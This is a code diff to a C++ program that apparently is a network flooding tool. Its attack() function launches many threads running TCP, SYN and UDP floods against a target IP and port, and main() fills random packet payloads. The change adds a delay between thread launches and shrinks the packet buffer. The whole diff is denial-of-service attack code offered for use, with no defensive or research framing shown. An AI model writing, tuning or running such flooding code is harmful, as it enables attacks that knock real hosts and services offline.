@@ -17,6 +17,7 @@ int attack(const char* ip, int port, const char* packet, int thread, int method)
             std::cout << " start tcp flood " << std::endl;
             for(int i = 0; i < thread; i++) {
                 std::thread(tcpflood, ip, port, packet).detach();
+                usleep(300 * 1000);
             }
 
             return METHOD_TCP;
@@ -27,6 +28,7 @@ int attack(const char* ip, int port, const char* packet, int thread, int method)
             std::cout << " start syn flood " << std::endl;
             for(int i = 0; i < thread; i++) {
                 std::thread(synflood, ip, port).detach();
+                usleep(300 * 1000);
             }
 
             return METHOD_SYN;
@@ -37,6 +39,8 @@ int attack(const char* ip, int port, const char* packet, int thread, int method)
             std::cout << " start udp flood " << std::endl;
             for(int i = 0; i < thread; i++) {
                std::thread(udpflood, ip, port, packet).detach();
+               usleep(300 * 1000);
+               
             }
 
             return METHOD_UDP;
@@ -66,7 +70,7 @@ int checkmethod(const char* method)
 int main(int argc, char** argv)
 {
     char ip[16] = "null";
-    char packet[2048] = "null";
+    char packet[1024] = "null";
     int port = 0;
     int thread = 0;
     int method = METHOD_NULL;
@@ -170,7 +174,7 @@ int main(int argc, char** argv)
     if(strcmp(packet, "null") == 0 && method != METHOD_SYN)
     {
         std::cout << " W: random packet " << std::endl;
-        for(int i = 0; i < 2048; i++) {
+        for(int i = 0; i < 1024; i++) {
             packet[i] = rand();
         }
     }
